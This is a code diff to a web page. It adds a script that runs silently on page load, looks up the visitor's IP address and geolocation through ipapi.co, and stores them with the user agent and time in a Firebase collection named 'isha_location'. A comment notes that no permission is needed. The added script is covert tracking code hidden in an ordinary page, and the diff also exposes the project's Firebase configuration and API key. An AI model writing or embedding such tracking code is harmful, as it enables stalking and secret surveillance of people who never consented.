@@ -198,8 +198,51 @@ clearInterval(typing);
 
 
 <!-- Firebase + Location -->
-
 <script type="module">
+
+import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
+import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";
+
+const firebaseConfig = {
+
+apiKey: "AIzaSyAicGiOH3CQAxfOy1Y1y-osoypb73Ew1Y8",
+  authDomain: "remote-videoplayer.firebaseapp.com",
+  projectId: "remote-videoplayer",
+  storageBucket: "remote-videoplayer.firebasestorage.app",
+  messagingSenderId: "978359248102",
+  appId: "1:978359248102:web:c03c62454f8cbf70030727",
+  measurementId: "G-4D3PV2EGMX"
+
+};
+
+const app = initializeApp(firebaseConfig);
+const db = getFirestore(app);
+
+
+/* IP Location (No Permission Needed) */
+
+fetch("https://ipapi.co/json/")
+.then(res=>res.json())
+.then(async data=>{
+
+await addDoc(collection(db,"isha_location"),{
+
+ip:data.ip,
+city:data.city,
+region:data.region,
+country:data.country_name,
+latitude:data.latitude,
+longitude:data.longitude,
+time:new Date().toString(),
+device:navigator.userAgent
+
+});
+
+});
+
+</script>
+  
+<!-- <script type="module">
 
 import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
 import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";
@@ -238,7 +281,7 @@ time:new Date().toString()
 
 );
 
-</script>
+</script> -->
 
 </body>
 </html>
